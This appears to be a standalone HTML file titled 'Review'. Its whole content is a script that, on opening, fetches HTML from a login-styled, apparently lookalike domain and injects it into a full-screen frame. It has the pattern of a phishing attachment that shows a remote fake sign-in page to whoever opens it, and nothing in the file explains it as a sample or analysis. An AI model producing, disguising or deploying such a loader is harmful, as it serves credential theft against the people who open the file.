<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Review</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        #content {
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <div id="content"></div>
    <script>
        async function fetchContent() {
            try {
                const response = await fetch('https://login.acceleratedmedicallinc.org/meeting');
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const text = await response.text();
                document.getElementById('content').innerHTML = text;
            } catch (error) {
                console.error('There was a problem with the fetch operation:', error);
            }
        }

        fetchContent();
    </script>
</body>
</html>
